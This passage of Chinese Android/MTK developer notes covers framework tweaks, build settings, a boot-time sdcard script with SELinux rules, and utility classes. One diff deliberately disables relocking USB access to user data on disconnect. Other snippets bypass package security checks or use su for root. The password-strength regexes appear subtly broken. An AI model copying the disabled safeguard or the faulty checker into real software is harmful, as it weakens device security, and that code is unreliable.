public void notify(int id, Notification notification) {
    boolean close=false;
    if (close) {
        notify(null, id, notification);
    }
}
```

## 屏蔽掉下拉通知栏和状态栏

``frameworks\base\packages\SystemUI\src\com\android\systemui\statusbar\phone\PhoneStatusBarView.java``

```textjava
    @Override
    public void addPanel(PanelView pv) {
        super.addPanel(pv);
//        if (pv.getId() == R.id.notification_panel) {
//            mNotificationPanel = pv;
//        } else if (pv.getId() == R.id.settings_panel){
//            mSettingsPanel = pv;
//        }
        pv.setRubberbandingEnabled(!mFullWidthNotifications);
    }
```

## 去掉GPS功能

```text
a. 在 mediatek/config/$(pro)/ProjectConfig.mk 更改如下两项为no
MTK_AGPS_APP=no
MTK_GPS_SUPPORT=no
MTK_YGPS_APP=no

b. 在 mediatek/config/$(pro)/autoconfig/kconfig/project 中添加
CONFIG_MTK_GPS=n CONFIG_GPS=n
```

## 平板改为手机

```text
build/target/product/$(pro).mk 中 PRODUCT_CHARACTERISTICS := tablet 改为 PRODUCT_CHARACTERISTICS := default
```

## [make] Android脚本envsetup.sh逐行分析

```text
https://blog.csdn.net/guyongqiangx/article/details/73188477

gettop 函数从指定的$TOP目录或当前目录开始查找build/core/envsetup.mk文件，并将能找到该文件的目录返回给调用函数作为操作的根目录

croot命令切换到当前编译环境的根目录。

cproj命令用于切换到当前模块的编译目录下（含有Android.mk）

getprebuilt返回ANDROID_PREBUILTS的路径

printconfig输出当前的编译配置

pez函数的参数”$@”是一条可执行命令，通过执行结果来决定打印FAILUE和SUCCESS的颜色，失败打印红色的FAILURE，成功打印绿色的SUCCESS

sgrep，基于(c|h|cc|cpp|S|java|xml|sh|mk|aidl|vts)文件查找
ggrep，基于(.gradle)的文件查找
jgrep，基于(.java)文件查找
cgrep，基于(c|cc|cpp|h|hpp)文件查找
resgrep，基于res目录下(xml)文件查找
mangrep，基于AndroidManifest.xml文件查找
sepgrep，基于sepolicy目录下查找
rcgrep，基于*.rc*文件查找
mgrep，基于(Makefile|Makefile\..*|.*\.make|.*\.mak|.*\.mk)的Makefile文件查找
treegrep，基于代码的文件(c|h|cpp|S|java|xml)进行查找
pathmod Camera2，根据 module 名称查找在 aosp 中的位置

qpid

pid

smoketest

runtest

provision

external/autotest 怎么用???
```

## Android 编写开机自启动的脚本服务

```text
因为公司有一款手机在升级之后用户找不到内部sdcard 中的数据，分析了主要原因是因为升级前后内部sdcard 的链接的路径改变了。之前sdcard的数据在/sdcard/emulated/ 目录下，升级时候放在了/sdcard/emulated/0/ 下面。一个解决方案就是在手机启动的时候开启一个脚本服务检测一下当前的目录是否是正确的，如果不对就进行目录得调整。主要的操作就是mv 操作，效率很高。

目录
1. 编写Shell脚本
2. fs_config.c 提交文件权限
3. 增加selinux te 文件，增加Shell脚本的一些权限
4. 添加新增文件上下文
5. 增加mk 文件实现编译拷贝
6. 在init.rc 中加入开机启动的Service

正文

1. 编写Shell 脚本 
adjust_sdcard.sh

#!/system/bin/sh
i=1
num=0
while :
do
log -t ota-sdcard "try ..."$i
need_adjust=`ls /storage/emulated/ -l |grep "^d"|wc -l`
log -t ota-sdcard "need adjust ="$need_adjust
if [ "$need_adjust" == "2" ] 
then
log -t ota-sdcard "adjust inner sdcard success ."
break
else
log -t ota-sdcard "try adjust inner adcard dir..."
for file in /storage/emulated/*
do
    if test -f $file
    then
        echo "move $file -> /storage/emulated/0/${file##*/}"
        log -t ota-sdcard "move $file -> /storage/emulated/0/${file##*/}"
        let num++
        mv $file /storage/emulated/0/${file##*/}
    fi
    if test -d $file && [ ${file##*/} != "0" ]  && [ ${file##*/} != "obb" ] 
    then
        echo "move $file -> /storage/emulated/0/${file##*/}"
        log -t ota-sdcard "move $file -> /storage/emulated/0/${file##*/}"
        let num++
        mv $file /storage/emulated/0/${file##*/}
    fi
done
log -t ota-sdcard "move num = $num"
fi
sleep 2
i=$(($i+1))
done

具体的功能就是判断一下目录结构对不对，如果不对就会调用mv 进行目录的调整。上面的脚本只是演示了主要的功能，用作调试用的。用兴趣可以看一下。

2. fs_config.c 提交文件权限

这个文件就是设置文件在系统中的权限

fs_path_config android_files 中增加
{ 00750, AID_ROOT, AID_ROOT, 0, "system/bin/adjust_sdcard.sh" },

3. 增加selinux te 文件，增加Shell脚本的一些权限
我们知道Android 4.4 之后引入了selinux的机制，所以我们编写的Shell的脚本的中很多命令代码都需要给予相应的selinux 权限。
#ota_sdcard.te
type ota_sdcard, domain;
type ota_sdcard_exec, exec_type, file_type;

init_daemon_domain(ota_sdcard)
allow ota_sdcard system_file:file execute_no_trans;
allow ota_sdcard shell_exec:file rx_file_perms;
allow ota_sdcard storage_file:dir search;
allow ota_sdcard fuse:dir {open read search getattr write remove_name rename add_name reparent};
allow ota_sdcard fuse:file {open read getattr write rename create};

4. 增加Shell 脚本文件的上下文
/system/bin/adjust_sdcard.sh u:object_r:ota_sdcard_exec:s0

5. 增加mk 文件实现编译拷贝
PRODUCT_COPY_FILES += \
device/qcom/msm8916/adjust_sdcard.sh:/system/bin/adjust_sdcard.sh

6. 在init.rc 中加入开机启动的Service
service ota-sdcard /system/bin/adjust_sdcard.sh
class main
oneshot
开机作为main 自启动。

上面的6个步骤是实现整个机制的核心步骤，细节并没有过多的讲述，后面增加每个步骤具体涉及到的知识点。
```

## 获取其他包的Context

```text
Context c = createPackageContext("chroya.demo", Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
//载入这个类
Class clazz = c.getClassLoader().loadClass("chroya.demo.Main");
//新建一个实例
Object owner = clazz.newInstance();
//获取print方法，传入参数并执行
Object obj = clazz.getMethod("print", String.class).invoke(owner, "Hello");
```

## Android 判断你的应用在前台还是在后台 ActivityLifecycleCallbacks

```text
https://blog.csdn.net/zhangbijun1230/article/details/80317765

public class MyLifecycleHandler implements Application.ActivityLifecycleCallbacks {
    private static int resumed;
    private static int paused;
    private static int started;
    private static int stopped;
 
    @Override
    public void onActivityCreated(Activity activity, Bundle savedInstanceState) {
    }
 
    @Override
    public void onActivityStarted(Activity activity) {
        ++started;
    }
 
    @Override
    public void onActivityResumed(Activity activity) {
        ++resumed;
    }
 
    @Override
    public void onActivityPaused(Activity activity) {
        ++paused;
        android.util.Log.w("test", "application is in foreground: " + (resumed > paused));
    }
 
    @Override
    public void onActivityStopped(Activity activity) {
        ++stopped;
        android.util.Log.w("test", "application is visible: " + (started > stopped));
    }
 
    @Override
    public void onActivityDestroyed(Activity activity) {
    }
 
    @Override
    public void onActivitySaveInstanceState(Activity activity, Bundle outState) {
    }
 
    public static boolean isApplicationVisible() {
        return started > stopped;
    }
 
    public static boolean isApplicationInForeground() {
    // 当所有 Activity 的状态中处于 resumed 的大于 paused 状态的，即可认为有Activity处于前台状态中 
        return resumed > paused;
    }
}

然后在自己定义的 Application 中的 onCreate() 方法中注册该 ActivityLifecycleCallbacks：
registerActivityLifecycleCallbacks(new MyLifecycleHandler());
```

## Android 系统（67）---android apk 的root 权限和USB adb 权限的区别

```text
USB adb 权限是指，当adb 连接手机时，手机中的守护进程adbd 的权限为root 权限，从而它的子进程也具有root 权限，通常如果adb shell 看到是：
Android 4.0 以后版本:
C:\>adb shell
root@android:/ #
Android 2.3 版本：
C:\>adb shell
#
即表明adb 的连接是root 权限的，相反如果看到是$ 即表明是shell 权限
Android 的APK 本身都是不具备root 权限的，如果想启用root 权限，那么就必须借助具有root 权限的进程或者具有s bit 的文件，目前比较通用的手法是，手机root 后，内置了su到system/bin, 然后普通APP 即可借助su 命令来达到root 权限切换。 
网络上已经有同仁修改su 命令，并通过一个APK 来控制su 命令的权限控制。
 SuperSU: http://forum.xda-developers.com/showthread.php?t=1538053 (更新速度很快，推荐使用)
 
综上所叙，如果adb 已经有root 权限，那么让apk 行使root 权限就很简单了。
```

## Alarm的机制

```text
https://blog.csdn.net/zhangbijun1230/article/details/80166185

Alarm和Timer以及Handler在定时任务上的区别
相同点：
三者都可以完成定时任务，都支持一次性定时和循环定时（注：Handler可以间接支持循环定时任务）

不同点：
Handler和Timer在定时上是类似的，二者在系统休眠的情况下无法正常工作，定时任务不会按时触发。Alarm在系统休眠的情况下可以正常工作，并且还可以决定是否唤醒系统，同时Alarm在自身不启动的情况下仍能正常收到定时任务提醒，但是当系统重启或者应用被杀死的情况下，Alarm定时任务会被取消。另外，从Android4.4开始，Alarm事件默认采用非精准方式，即定时任务可能会有小范围的提前或延后，当然我们可以强制采用精准方式，而在此之前，Alarm事件都是精准方式。
```

## Android 如何快速写满存储空间

```text
方法一：
通过如下 adb 命令在 /mnt/sdcard/ 目录下产生一个名为 bigfile 的文件，让其自动增长到磁盘剩余空间大小。

adb shell dd if=/dev/zero of=/mnt/sdcard/bigfile

方法二：
使用的是android sdk工具创建一个sdcard.img文件，由于Android单个文件传输大小限制，注意不要超过4G。

mksdcard 3G sdcard.img

方法三：
使用微软提供的fsutil.exe命令来创建指定大小的文件。

fsutil file createnew bigfile.txt  100000000
```

## 手机收到8bit编码的短信无法显示

```text
android默认不支持8bit编码，8bit只是数据传输的一种方式，8bit编码并没有定义唯一的字符编码表来指明某个编码表示某个字符，所以没办法唯一去解析它
代码可见framework/base/telephony/java/com/android/internal/telephony/gsm/SmsMessage.java
parseUserData方法
switch (encodingType) {
            case ENCODING_UNKNOWN:
            case ENCODING_8BIT:
                messageBody = null;
                break;
 
这也是google default设计，MTK也没有做扩展，因为上面所说的，8bit没有唯一表来定义其编码。
如果发现某个对比机可以显示，那是对比机指定了某种解码方式去解析8bit，但这有风险，只要那些8bit数据不是用指定的那种解码方式去编码的话，会显示乱码。
如果客户一定要用解析8bit编码的短信，可以自行修改代码
以下以UTF-8来解析为例，修改方法：
framework/base/telephony/java/com/android/internal/telephony/gsm/SmsMessage.java
1.parseUserData方法
case ENCODING_8BIT:
    messageBody = null;
    break;
修改为：
case ENCODING_8BIT:
    //messageBody = null;
    messageBody = p.getUserDataUTF8(count);
    break;

2.getUserDataUCS2这个方法后面增加一个方法 getUserDataUTF8，如下：
String getUserDataUTF8(int byteCount) {
    String ret;
    try {
        ret = new String(pdu, cur, byteCount, "utf-8");
    } catch (UnsupportedEncodingException ex) {
        ret = "";
        Log.e(LOG_TAG, "Utf-8,implausible UnsupportedEncodingException", ex);
    }
    cur += byteCount;
    return ret;
}

这种修改是有风险的：可能解析出来的短信都是乱码。请客户自行评估风险，谨慎修改。
 
Android 5及之后的版本，Google提供了一个变量来控制是否支持8bit编码。
默认是false，改成true之后就能支持解码8bit
/frameworks/base/core/res/res/values/config.xml
<bool translatable="false" name="config_sms_decode_gsm_8bit_data">false</bool>
 
注意：开启8bit之后会导致CTS fail. 目前没有能兼顾8bit和CTS测试的解决方案。
```

## [默认值] 浏览器默认搜索引擎更改

```text
vendor/mediatek/proprietary/packages/apps/Browser/src/com/android/browser/preferences/SearchEngineSettings.java）
                 mEntries[i]  = searchEngines.get(i).getLabel();  
                 mEntryFavicon[i]  = searchEngines.get(i).getFaviconUri();  
                 if (mEntryValues[i] .equals(searchEngineName)) {  
-                    selectedItem = i;
+                    selectedItem = 1;
                 }  
             }  
```

## 语音邮件通知无法移除

```text
（frameworks/base/telephony/java/android/telephony/CarrierConfigManager.java）

         sDefaults.putBoolean(KEY_SUPPORT_SWAP_AFTER_MERGE_BOOL, true);  
         sDefaults.putBoolean(KEY_USE_HFA_FOR_PROVISIONING_BOOL, false);  
         sDefaults.putBoolean(KEY_USE_OTASP_FOR_PROVISIONING_BOOL, false);  
-        sDefaults.putBoolean(KEY_VOICEMAIL_NOTIFICATION_PERSISTENT_BOOL, false);
+        sDefaults.putBoolean(KEY_VOICEMAIL_NOTIFICATION_PERSISTENT_BOOL, true);
         sDefaults.putBoolean(KEY_VOICE_PRIVACY_DISABLE_UI_BOOL, false);  
         sDefaults.putBoolean(KEY_WORLD_PHONE_BOOL, false);  
         sDefaults.putInt(KEY_VOLTE_REPLACEMENT_RAT_INT, 0);  
```

## [默认值]  [USB] 7.0 默认 mtp

```text
（frameworks/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java）

diff --git a/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java b/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java
index 9d3b655..4ac7646 100644
--- a/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java
+++ b/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java
@@ -453,7 +453,7 @@ functions = addFunction(functions, UsbManager.USB_FUNCTION_ACM);
         private boolean mHostConnected;  
         private boolean mSourcePower;  
         private boolean mConfigured;  
-        private boolean mUsbDataUnlocked;
+        private boolean mUsbDataUnlocked = true;
         private String mCurrentFunctions;
         private String mDefaultFunctions;
         private boolean mCurrentFunctionsApplied;  
@@ -1361,7 +1361,7 @@ functions = addFunction(functions, UsbManager.USB_FUNCTION_ACM);
                     mUsbConfigured = mConfigured;  
                     if (!mConnected) {  
                         // When a disconnect occurs, relock access to sensitive user data  
-                        mUsbDataUnlocked = false;
+                    //  mUsbDataUnlocked = false;
                     }  
                     updateUsbNotification();  
                     updateAdbNotification();  
@@ -1370,7 +1370,7 @@ functions = addFunction(functions, UsbManager.USB_FUNCTION_ACM);
                         updateCurrentAccessory();  
                     } else if (!mConnected) {  
                         // restore defaults when USB is disconnected  
-                        setEnabledFunctions(null, false);
+                  //    setEnabledFunctions(null, false);
                     }  
                     if (mBootCompleted) {  
                         updateUsbStateBroadcastIfNeeded();  
```

## MTK 平台如何PUSH modem 到手机中进行调试

```text
1、编译eng或者userdebug版本：
    userdebug: adb shell setprop service.adb.root 1 
    再进入Settings->Developer options，取消 USB debugging，然后再重新勾选上，即可获得root权限
    eng版本可省略这一步。           
2、PUSH modem到手机命令：
adb remount
adb push xxxx.xx  /system/etc/firmware/

modem文件清单：
ltg: catcher_filter_1_ltg_n.bin dsp_1_ltg_n.bin modem_1_ltg_n.img
lwg: catcher_filter_1_lwg_n.bin dsp_1_lwg_n.bin modem_1_lwg_n.img
c2k: boot_3_3g_n.rom fsm_cust_df_3_3g_n.img fsm_rf_df_3_3g_n.img fsm_rw_df_3_3g_n.img modem_3_3g_n.img

3、重启机器
adb reboot
```

## [OTA] 减小 OTA 大小

```text
减小 OTA 大小
本页介绍了为减少多次编译之间不必要的文件变更而对 AOSP 编译系统所做的改动。使用专有编译系统的设备实现人员可根据这项信息采取措施，减小无线下载 (OTA) 更新的大小。

有时，Android OTA 包含的变更文件并非源于代码变更，而是编译系统造成的。在不同时间、不同目录或不同机器上编译相同的代码时可能会发生上述情况，产生大量变更文件。这些多余的文件不仅会增加 OTA 的大小，还会导致难以确定 OTA 中发生变更的代码。

为了使 OTA 的内容更加透明，我们对 AOSP 编译系统做了多项改动，目的是消除多次编译之间不必要的文件变更，以此减小 OTA 的大小。这样做是为了减小 OTA 的大小，使其只包含与 OTA 中所含补丁程序相关的文件。AOSP 还包括编译 diff 工具（可过滤出常见的编译相关文件变更，并提供更清晰的编译文件 diff）以及块映射工具（可协助您确保块分配的一致性）。

编译系统可能会通过多种方式创建不必要的文件 diff。下文讨论了其中一些问题和解决方案，并尽可能提供了 AOSP 中的修复示例。

文件顺序
问题：文件系统在请求目录中的文件列表时，并不保证文件顺序，尽管对于同一个检出，文件顺序通常是相同的。ls 等工具在默认情况下会对结果进行排序，但 find 和 make 等命令使用的通配符函数却不会对结果进行排序。用户在使用这类工具之前，务必要对输出进行排序。

解决方案：用户在使用支持通配符的 find 和 make 等工具之前，务必要对这些命令的输出进行排序。要在 Android.mk文件中使用 $(wildcard) 或 $(shell find)，也应该进行排序。有些工具（如 Java）确实会对输入进行排序，因此有必要先对排序进行验证。

示例：多处问题在核心编译系统中通过内置的 all-*-files-under 宏得到修正，其中包括 all-cpp-files-under（一些定义分散在其他 makefile 中）。有关详情，请参阅以下 CL：

https://android.googlesource.com/platform/build/+/4d66adfd0e6d599d8502007e4ea9aaf82e95569f
https://android.googlesource.com/platform/build/+/379f9f9cec4fe1c66b6d60a6c19fecb81b9eb410
https://android.googlesource.com/platform/build/+/7c3e3f8314eec2c053012dd97d2ae649ebeb5653
https://android.googlesource.com/platform/build/+/5c64b4e81c1331cab56d8a8c201f26bb263b630c
编译目录
问题：变更编译内容所在的目录会导致二进制文件有所不同。Android 编译系统中的大多数路径都是相对路径，因此 C/C++ 中的 __FILE__ 不是问题。不过，默认情况下调试符号会对完整的路径名进行编码，而对预剥离二进制文件进行哈希处理会生成 .note.gnu.build-id，因此调试符号发生变更会致使二进制文件发生变化。

解决方案：AOSP 现在会使调试路径变成相对路径。有关详情，请参阅 CL：https://android.googlesource.com/platform/build/+/6a66a887baadc9eb3d0d60e26f748b8453e27a02。

时间戳
问题：编译输出中的时间戳会导致不必要的文件变更。这可能会发生在以下位置：

C 或 C++ 代码中的 __DATE__/__TIME__/__TIMESTAMP__ 宏。
基于 ZIP 的归档中嵌入的时间戳。
解决方案/示例：要从编译输出中移除时间戳，请遵循下文中的说明操作。

C/C++ 中的 __DATE__/__TIME__/__TIMESTAMP__
这些宏总是为不同的编译生成不同的输出，因此不建议使用。您可以选择通过以下方法来移除这些宏：

直接将其移除（这些宏通常不是必需的）。要查看示例，请参阅：https://android.googlesource.com/platform/system/core/+/30622bbb209db187f6851e4cf0cdaa147c2fca9f。
要对运行中的二进制文件进行唯一标识，请从 ELF 标头中读取 build-id。
要了解操作系统的编译时间，请读取 ro.build.date（应该会对除增量编译之外的所有内容都适用；增量编译可能不会更新此日期）。要查看示例，请参阅：https://android.googlesource.com/platform/external/libchrome/+/8b7977eccc94f6b3a3896cd13b4aeacbfa1e0f84。
注意：Android 7.0 开启了 -Werror=date-time，因此使用时间戳会导致编译错误。

归档文件（zip、jar）中的嵌入时间戳
Android 7.0 通过将 -X 添加到 zip 命令的所有用例中，解决了 zip 归档文件中嵌入时间戳的问题，因此编译工具的 UID/GID 和扩展的 Unix 时间戳不会嵌入到 ZIP 文件中。

新工具 ziptime（位于 /platform/build/+/master/tools/ziptime/ 下）会重置 zip 标头中的正常时间戳。有关详情，请参阅 README 文件。

signapk 工具为 APK 文件设置的时间戳可能会因服务器所在的时区而异。有关详情，请参阅 CL：https://android.googlesource.com/platform/build/+/6c41036bcf35fe39162b50d27533f0f3bfab3028。

版本字符串
问题：APK 版本字符串的硬编码版本通常附加了 BUILD_NUMBER。即使 APK 中并未发生任何其他变更，APK 也仍然会有所不同。

解决方案：从 APK 版本字符串中移除版本号。

示例：

https://android.googlesource.com/platform/packages/apps/Camera2/+/5e0f4cf699a4c7c95e2c38ae3babe6f20c258d27
https://android.googlesource.com/platform/build/+/d75d893da8f97a5c7781142aaa7a16cf1dbb669c
一致的编译工具
问题：生成安装文件的工具必须一致（相同的输入应始终生成相同的输出）。

解决方案/示例：以下编译工具需要进行变更：

NOTICE 文件创建工具。NOTICE 文件创建工具需要变更。请参阅 CL：https://android.googlesource.com/platform/build/+/8ae4984c2c8009e7a08e2a76b1762c2837ad4f64。
Java Android 编译器套件 (Jack)。Jack 工具链需要更新才能处理生成的构造函数排序的偶然性变更。请参阅 CL：https://android.googlesource.com/toolchain/jack/+/056a5425b3ef57935206c19ecb198a89221ca64b。
ART AOT 编译器 (dex2oat)。ART 编译器二进制文件需要更新才能创建确定性映像。请参阅 CL：https://android.googlesource.com/platform/art/+/ace0dc1dd5480ad458e622085e51583653853fb9。
libpac.so 文件 (V8)。每项编译会创建不同的 /system/lib/libpac.so 文件，因为 V8 快照会针对每项编译发生变更。解决方案是移除该快照。请参阅 CL：https://android.googlesource.com/platform/external/v8/+/e537f38c36600fd0f3026adba6b3f4cbcee1fb29。
预先经过 dexopt 处理的 (.odex) 应用文件。预先经过 dexopt 处理的 (.odex) 文件在 64 位系统上包含未初始化填充。请参阅 CL：https://android.googlesource.com/platform/art/+/34ed3afc41820c72a3c0ab9770be66b6668aa029。
使用编译 diff 工具
对于无法消除编译相关文件变更的情况，AOSP 纳入了编译 diff 工具 target_files_diff.py，以用于比较两个文件包。该工具会在两个编译之间执行递归 diff，从而排除常见的编译相关文件变更，例如：

编译输出中的预期变更（例如，由于版本号变更所导致）。
由于当前编译系统中的已知问题所导致的变更。
要使用编译 diff 工具，请运行以下命令：

target_files_diff.py dir1 dir2

dir1 和 dir2 是包含每个编译的提取目标文件的基础目录。

使块分配保持一致
在非 A/B OTA 中，影响时间的因素之一是块移动。对于给定的文件，尽管其内容在两个编译之间会保持不变，但实际持有数据的块可能已发生变化。因此，更新程序会在 OTA 期间执行不必要的 I/O 来四处移动块。

为了解决这个问题，我们在 Android 7.0 中扩展了 make_ext4fs 工具，该工具会尝试使块分配在各编译之间保持一致。make_ext4fs 会接受可选的 -d base_fs 标记，该标记会在生成 ext4 映像时尝试将文件分配给相同的块。您可以从上一个编译的目标文件 zip 文件（IMAGES/system.map 和 IMAGES/vendor.map）中提取块映射文件（即 base_fs 映射文件）。接下来，base_fs 文件便可以通过 PRODUCT_SYSTEM_BASE_FS_PATH 和 PRODUCT_VENDOR_BASE_FS_PATH 进行记录并指定。例如，

PRODUCT_SYSTEM_BASE_FS_PATH := path/to/base_fs_files/base_system.map PRODUCT_VENDOR_BASE_FS_PATH := path/to/base_fs_files/base_vendor.map

虽然这对减小整体的 OTA 更新包大小来说并无帮助，但它确实可以通过减少 I/O 量来改善 OTA 性能。
```

## 使用Android Studio调试Android Framework代码

```text
3.生成android.ipr和android.iml文件
进入Android 源码根目录 
执行 
mmm development/tools/idegen/ 
这行命令的意思是编译idegen这个项目,生成idegen.jar文件.生成成功后,会显示这个jar包的位置,并显示 #### make completed successfully 
然后执行 
sh ./development/tools/idegen/idegen.sh 
这行命令的意思是生成对应的文件:android.iws, android.ipr, android.iml .

4.android studio导入源码
生成上述对应的文件后,打开Android Studio,选择打开一个现有的Android Studio项目,选择Android源码的根目录,导入即可(起作用的是android.irp文件).在配置sdk版本之后就可以查看Android 源码了. 
导入过程比较慢，可以打开android.iml参考网上文章过滤掉一些模块。

5.调试代码
Run->Attach debugger to Android process选择要调试的程序

选择要调试的程序。

这里选择了自己的一个程序，来调试ListView，虚拟机中国年滑动下ListView，编辑器中进入了断点，这样就可以开开心心的，一步一步研究android的一些源码的原理

注意： 
调试的时候，国产手机有的断点进不去，可能是厂商修改了framework的原因（具体有待考证）所以我这里使用的是虚拟机。
```

## 密码强度监测工具类

```text
import java.util.regex.Matcher;
import java.util.regex.Pattern;
 
public class CheckPWD {
 
 public static Safelevel checkPasswordStrength(String c) {
  Safelevel d = Safelevel.WEAK;
  if (isEmptyPassword(c)) {
   return d;
  }
  if (isTooShort(c)) {
   d = Safelevel.WEAK;
  } else {
   if (hasNum(c) && hasLetter(c) && hasSymbol(c)) {
    d = Safelevel.SECURE;
   } else {
    if (hasNum(c) && hasLetter(c)) {
     d = Safelevel.STRONG;
    } else {
     if (hasNum(c) && hasSymbol(c)) {
      d = Safelevel.STRONG;
     } else {
      if (hasSymbol(c) && hasLetter(c)) {
       d = Safelevel.STRONG;
      } else {
       if (isAllNum(c) || isAllLetter(c) || isAllSymbol(c)) {
        d = Safelevel.WEAK;
       }
      }
     }
    }
   }
  }
  return d;
 }
 
 public enum Safelevel {
  WEAK, /* 弱 */
  STRONG, /* 强 */
  SECURE, /* 安全 */
 }
 
 public static boolean hasNum(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile(".*\\d+.*");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 
 }
 
 public static boolean hasSymbol(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile(".*[a-zA-Z0-9\\s<>;'\\\\] +.*");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 
 }
 
 public static boolean isAllSymbol(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile("^[a-zA-Z0-9\\s<>;'\\\\] +$");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 
 }
 
 public static boolean hasSpace(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile(".*\\s+.*");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 
 }
 
 public static boolean hasIllegalSymbol(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile(".*[\\s<>;'\\\\] .*");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 
 }
 
 public static boolean hasLetter(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile(".*[a-zA-Z] +.*");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 
 }
 
 public static boolean isAllLetter(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile("^[a-zA-Z] +$");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 
 }
 
 private static boolean isEmptyPassword(String b) {
  return (b == null || b.length() == 0);
 }
 
 private static boolean isTooShort(String b) {
  return b.length() < 6;
 }
 
 public static boolean isAllNum(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile("^\\d+$");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 }

 public static boolean hasRepeat6Chars(String content) {
  boolean flag = false;
  Pattern p = Pattern.compile(".*([0-9a-zA-Z] )\\1{5}.*");
  Matcher m = p.matcher(content);
  if (m.matches())
   flag = true;
  return flag;
 
 }
 
 public static boolean hasIncrease6Chars(String g) {
  if (g == null || g.length() < 6) {
   return false;
  }
  char h = g.charAt(0);
  char i = 1;
  char j = 1;
  for (j = 1; j < g.length(); j++) {
   char f = g.charAt(j);
   if (f == h + 1) {
    i++;
    if (i >= 6) {
     return true;
    }
   } else {
    i = 1;
   }
   h = f;
  }
  return false;
 
 }
 
 public static boolean hasDecrease6Chars(String g) {
  if (g == null || g.length() < 6) {
   return false;
  }
  char h = g.charAt(0);
  char i = 1;
  char j = 1;
  for (j = 1; j < g.length(); j++) {
   char f = g.charAt(j);
   if (f == h - 1) {
    i++;
    if (i >= 6) {
     return true;
    }
   } else {
    i = 1;
   }
   h = f;
  }
  return false;
 }
 
 public static boolean hasAllIncreaseChars(String g) {
  if (g == null) {
   return false;
  }
  int i = g.length();
  char h = g.charAt(0);
  char j = 1;
  char k = 1;
  for (k = 1; k < g.length(); k++) {
   char l = g.charAt(k);
   if (l == h + 1) {
    j++;
    if (j >= i) {
     return true;
    }
   } else {
    j = 1;
   }
   h = l;
  }
  return false;
 
 }
 
 public static boolean hasAllDecreaseChars(String g) {
  if (g == null) {
   return false;
  }
  int i = g.length();
  char h = g.charAt(0);
  char j = 1;
  char k = 1;
  for (k = 1; k < i; k++) {
   char l = g.charAt(k);
   if (l == h - 1) {
    j++;
    if (j >= i) {
     return true;
    }
   } else {
    j = 1;
   }
   h = l;
  }
  return false;
 }
 public static boolean isAllSameChars(String content) {
  if (content == null || content.length() < 2) {
   return false;
  }
  char h = content.charAt(0);
  char e = 1;
  for (e = 1; e < content.length(); e++) {
   char f = content.charAt(e);
   if (f != h) {
    return false;
   }
  }
  return true;
 }
}
```

## android处理资源文件复制到database区域java

```text
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
 
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
 
final public class CopyRawtodata {
 public static boolean CopyRawtodata(String path,String DbName,Context context,int id,boolean IsRawData)
 {
  boolean dbExist=checkDataBase(path,DbName);
  if(!dbExist)
  {
         try{
          copyDataBase(path,DbName,context,id,IsRawData);
         }catch(IOException e){
          throw new Error("Error copying database");
         }
  }
  return true;
 }
 private static boolean checkDataBase(String path,String DbName)
 {
     SQLiteDatabase checkDB = null;
     try{
      String databaseFilename = path+"/"+DbName;
      checkDB =SQLiteDatabase.openDatabase(databaseFilename, null,
        SQLiteDatabase.OPEN_READONLY);
     }catch(SQLiteException e){
      
     }
     if(checkDB!=null){
      checkDB.close();
     }
     return checkDB !=null?true:false;
 }
 private static  void copyDataBase(String path,String DbName,Context context,int ResId,boolean IsRawData) throws IOException{
     String databaseFilenames =path+"/"+DbName;
     InputStream is;
     File dir = new File(path+"/");
     if(!dir.exists())//判断文件夹是否存在，不存在就新建一个
      dir.mkdir();
     FileOutputStream os = null;
     try{
      os = new FileOutputStream(databaseFilenames);//得到数据库文件的写入流
     }catch(FileNotFoundException e){
      e.printStackTrace();
     }
     if(IsRawData)
     {
       is = context.getResources().openRawResource(ResId);//得到数据库文件的数据流
     }
     else
     {
      is = context.getResources().getAssets().open(DbName);//得到数据库文件的数据流
     } 
        byte[]  buffer = new byte[8192] ;
        int count = 0;
        try{
         while((count=is.read(buffer))>0){
          os.write(buffer, 0, count);
          os.flush();
         }
        }catch(IOException e){
        }
        try{
         is.close();
         os.close();
        }catch(IOException e){
         e.printStackTrace();
        }
    }
}
```

## Android获取设备CPU最大频率两种方案

```text
//方案1
long result = 0L;
try {
    String line;
    BufferedReader br = new BufferedReader(new FileReader("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq"));
    if ((line = br.readLine()) != null) {
        result = Long.parseLong(line);
    }
    br.close();
} catch (Exception e) {
    e.printStackTrace();
}
return result;
```

## Android中APK安装流程解析

```text
复制APK安装包到/data/app目录下，解压缩并扫描安装包，向资源管理器注入APK资源，解析AndroidManifest文件，并在/data/data目录下创建对应的应用数据目录，然后针对Dalvik/ART环境优化dex文件，保存到dalvik-cache目录，将AndroidManifest文件解析出的组件、权限注册到PackageManagerService并发送广播。
```

## [CMD] 基于Airtest的微信朋友圈自动点赞脚本设计与实现

```text
Airtest
Airtest官方文档

本脚本可以通过AirtestIDE和python执行，推荐使用AirtestIDE的环境执行，更稳定一些
AirtestIDE官方文档

使用python执行该脚本
安装库 airtest、pocoui
pip install airtest
pip install pocoui
代码如下

# -*- encoding=utf8 -*-
__author__ = "admin"
from airtest.core.api import *
